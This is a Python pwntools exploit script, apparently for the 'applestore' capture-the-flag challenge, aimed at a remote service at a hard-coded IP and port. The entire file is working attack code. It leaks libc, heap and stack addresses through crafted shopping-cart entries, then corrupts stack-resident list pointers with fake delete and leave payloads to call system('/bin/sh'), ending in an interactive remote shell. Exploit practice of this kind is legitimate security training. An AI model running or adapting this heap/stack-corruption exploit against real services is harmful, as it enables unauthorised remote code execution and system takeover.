from pwn import *
import time, sys

# local process envirnoment
LOCAL = False
elf_name = "./applestore"

#retmote args
remote_host = "140.113.209.24"
remote_port = 10002
# context.clear(arch="amd64", os="linux")
context.clear(arch="i386", os="linux")
elf = ELF(elf_name)

if LOCAL:
    #context.log_level = "debug"
    malloc_off = 0x70D80
    system_off = 0x3ADA0
    execsh_off = 0x3AC8D
    puts_off = 0x5FCA0

    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
    '''
    io = process(elf_name)
    '''
else:
    #context.log_level = "debug"
    malloc_off = 0x766B0
    system_off = 0x40190
    execsh_off = 0x40063
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)

def mmenu(opt):
    io.recvuntil("> ")
    io.send(str(opt).ljust(0x15))

def list():
    mmenu(1)

def add(idx):
    mmenu(2)
    io.recvuntil("Device Number> ")
    io.sendline(str(idx))

def delete(idx):
    mmenu(3)
    io.sendline(str(idx))

def cart(opt):
    mmenu(4)
    dlySend(opt)

def checkout(opt):
    mmenu(5)
    dlySend(opt)

def leave():
    mmenu(6)

def fake_add(payload):
    mmenu(2)
    io.recvuntil("Device Number> ")
    dlySend(payload)

def fake_del(payload):
    mmenu(3)
    io.recvuntil("> ")
    dlySend(payload)
    io.recvuntil("shopping cart.\n")

def fake_leave(payload):
    io.recvuntil("> ")
    dlySend(payload)

def s_exp():
    start_list_addr = 0x804B070
    main_addr = 0x8048CA6
    heap_off = 0x3E0
    for i in range(19):
        add(1)  # 199
    for i in range(6):
        add(3)  # 499
    add(4)  #399
    checkout("y")
    payload = 'y'+'\x00'+p32(elf.got['malloc'])+p32(0)+p32(0)
    cart(payload)
    io.recvuntil("27: ")
    data = io.recv(4)
    malloc_addr = u32(data)
    libc_addr = malloc_addr - malloc_off
    log.info("libc address:"+hex(libc_addr))
    system_addr = system_off + libc_addr
    log.info("system address:"+hex(system_addr))
    execsh_addr = execsh_off + libc_addr

    payload = 'y'+'\x00'+p32(start_list_addr)+p32(0)+p32(0)
    cart(payload)
    io.recvuntil("27: ")
    heap_addr = u32(io.recv(4))
    log.info("heap address:"+hex(heap_addr))
    payload = 'y'+'\x00'+p32(heap_addr+heap_off)+p32(0)+p32(0)
    cart(payload)
    io.recvuntil("27: ")
    stack_addr = u32(io.recv(4))
    log.info("stack address:"+hex(stack_addr))
    # exploit
    atoi_bss = elf.got['atoi']
    payload = str(27) + '\x00'*4 + p32(system_addr) + p32(stack_addr+0x04+0x22+0x20) + p32(stack_addr+0x20-0x08)
    # payload = str(27) + '\x00'*4 + p32(system_addr) + p32(stack_addr+0x04+0x20+0x18+0x40) + p32(stack_addr+0x20-0x08)
    payload = payload.ljust(0x15, chr(0))
    fake_del(payload)

    # FFFD6EC8
    # FFBBA254 FFBBA294
    pause()

    cmds = "/bin/sh\x00"
    payload = p32(system_addr) + p32(stack_addr+0x30) + p32(stack_addr+0x30) + cmds
    payload = payload.ljust(0x15, chr(0))
    '''
    cmds = "sh".ljust(4, chr(0)) + p32(stack_addr+0x44+0x1C)
    payload = '6\x00' + cmds + p32(system_addr) + p32(stack_addr+0x44) + p32(stack_addr+0x1C)
    #payload = payload.ljust(0x15, chr(0))
    '''
    fake_leave(payload)
    io.interactive()

if __name__ == "__main__":
    s_exp()
    pause()
